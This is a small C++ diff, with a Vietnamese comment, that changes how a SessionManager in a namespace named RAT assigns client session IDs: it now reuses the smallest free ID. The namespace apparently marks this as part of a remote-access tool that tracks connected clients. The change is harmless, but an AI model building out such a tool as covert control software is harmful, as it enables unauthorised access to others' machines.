@@ -12,7 +12,13 @@ namespace RAT
     int SessionManager::add_session(int sock, const std::string &ip, int port)
     {
         std::lock_guard<std::mutex> lock(map_mtx_);
-        int id = next_id_++;
+        
+        // Tái sử dụng ID số nguyên dương nhỏ nhất còn trống (bắt đầu từ 1)
+        int id = 1;
+        while (sessions_.find(id) != sessions_.end())
+        {
+            id++;
+        }
 
         auto session = std::make_shared<ClientSession>();
         session->id = id;
